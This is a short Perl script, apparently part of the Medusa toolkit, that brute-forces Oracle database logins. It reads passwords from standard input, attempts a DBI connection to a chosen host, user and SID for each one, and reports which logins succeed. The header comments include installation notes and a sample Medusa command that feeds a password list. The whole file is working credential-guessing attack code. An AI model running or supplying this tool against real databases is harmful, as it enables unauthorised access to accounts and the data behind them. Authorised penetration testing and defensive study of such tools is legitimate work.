#!/usr/bin/perl
#
# Oracle Brute-Force Medusa Wrapper Script
#   Copyright (C) 2006 Joe Mondloch
#   JoMo-Kun / jmk@foofus.net
#
# Based on bfora.pl <dab@digitalsec.net>
# See bfora for SID enumeration command. Not valid on all Oracle installs...
#
# Requires DBD::Oracle
#
# Gentoo Installation Notes
#  [/etc/portage/packages.keywords]
#    app-admin/eselect-oracle ~x86
#    dev-db/oracle-instantclient-basic ~x86
#    dev-db/oracle-instantclient-sqlplus ~x86
#
# g-cpan -i DBD::Oracle
#   If install fails looking *.mk:
#     cd .cpan/build/DBD-Oracle-1.17; su
#     export ORACLE_HOME=/usr/lib/oracle/10.2.0.2/client/lib
#     export LDPATH=/usr/lib/oracle/10.2.0.2/client/lib
#     export C_INCLUDE_PATH=/usr/lib/oracle/10.2.0.2/client/include
#     perl Makefile.PL
#     make install
#     
#     Verify that permissions were set correctly on installed files.

# oracle.pl -h 192.168.0.1 -u foo
#
# medusa -M wrapper -h 192.168.0.1 -u SYSTEM -P passwords.txt -m TYPE:STDIN -m PROG:oracle.pl -m ARGS:"%H %U ORCL"

require DBI;
require DBD::Oracle;

$host = $ARGV[0];
$user = $ARGV[1];
$sid  = $ARGV[2];
pop(@ARGV);
pop(@ARGV);
pop(@ARGV);

my $port = "1521";
#my $port = "15004";

while (<>) {
  chomp;
  $pass = $_;
 
  my $msg = "", $err = 0;
  $SIG{__WARN__} = sub { $msg = $_[0]; };
  DBI->connect("dbi:Oracle:host=$host;sid=$sid;port=$port", "$user", "$pass", { RaiseError => 0, PrintError => 1}) or $err = "1";
  
  if ($err)
  {
    if ($msg)
    {
      if ($msg =~ /ORA-01017: invalid username\/password; logon denied/)
      {
        print STDERR "LOGIN_RESULT_FAIL\n";
      }
      else
      {
        $msg =~ /failed: (.*) \(DBD ERROR/;
        print STDERR "LOGIN_RESULT_ERROR:$1\n";
      }
    }
    else
    {
      print STDERR "LOGIN_RESULT_FAIL\n";
    }
  }
  else
  {
    print STDERR "LOGIN_RESULT_SUCCESS\n"; 
  }
}
